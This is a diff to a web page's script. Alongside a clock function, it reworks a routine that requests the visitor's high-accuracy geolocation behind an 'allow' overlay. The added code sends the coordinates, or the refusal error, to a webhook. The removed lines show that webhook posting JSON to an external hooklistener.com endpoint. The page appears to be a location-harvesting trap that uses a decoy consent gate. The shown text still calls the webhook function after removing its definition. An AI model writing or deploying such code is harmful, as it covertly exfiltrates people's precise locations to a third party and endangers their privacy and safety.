@@ -121,54 +121,34 @@ function updateClockManualAmPm() {
 }
 	setInterval(updateClockManualAmPm, 1000);
 	updateClockManualAmPm();
-	
-  document.addEventListener("DOMContentLoaded", () => {
-  console.log("Page loaded, waiting for user consent");
-
-  const overlay = document.getElementById("overlay");
-  const content = document.getElementById("content");
-  const allowBtn = document.getElementById("allow");
-
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported by this browser");
-    return;
-  }
-
-  allowBtn.addEventListener("click", requestLocation);
-});
 
 function requestLocation() {
-  navigator.geolocation.getCurrentPosition(
-    onLocationGranted,
-    onLocationDenied
-  );
-}
-
-function onLocationGranted(position) {
-  // Unlock site
+  // Unlock UI immediately
   document.getElementById("overlay").style.display = "none";
   document.getElementById("content").style.display = "block";
 
-  // Send data
-  sendToWebhook({
-    latitude: position.coords.latitude,
-    longitude: position.coords.longitude,
-    accuracy: position.coords.accuracy,
-    timestamp: new Date().toISOString()
-  });
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      sendToWebhook({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      });
+    },
+    error => {
+      sendToWebhook({
+        error: error.message,
+        timestamp: new Date().toISOString()
+      });
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
 }
-
-function onLocationDenied(error) {
-  alert("Location permission is required to use this site.");
-}
-
-function sendToWebhook(payload) {
-  fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  }).catch(err => console.error("Webhook failed", err));
-};
 
 </script>
 </body>
